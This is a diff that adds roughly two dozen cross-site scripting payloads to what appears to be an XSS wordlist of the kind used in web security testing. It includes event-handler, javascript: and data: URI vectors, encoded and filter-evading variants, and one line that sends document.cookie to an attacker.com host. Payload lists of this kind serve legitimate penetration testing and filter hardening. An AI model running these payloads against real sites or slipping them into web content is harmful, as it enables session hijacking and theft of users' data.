@@ -47,3 +47,29 @@
 <img src=x onerror="alert(1)">
 <img src=x onerror='alert(1)'>
 <img src=x onerror=alert(1)//
+<svg/onload=alert(1)>
+<img src=x onerror=alert(1)>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<iframe src=javascript:alert(1)>
+<body onload=alert(1)>
+"><script>alert(1)</script>
+';alert(1);//
+"><img src=x onerror=prompt(1)>
+<script>fetch('https://attacker.com?c='+document.cookie)</script>
+<svg><script>alert&#40;1)</script>
+<img src=x:alert(alt) onerror=eval(src) alt=xss>
+<svg/onload=eval(atob('YWxlcnQoMSk='))>
+<details open ontoggle=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<video><source onerror="alert(1)">
+<audio src=x onerror=alert(1)>
+<marquee onstart=alert(1)>
+<div onpointerover="alert(1)">XSS</div>
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+';alert`1`;//
+<img src=x onerror=alert`1`>
+<svg><script xlink:href=data:,alert(1) />
+<math><mi xlink:href="data:x,<script>alert(1)</script>">
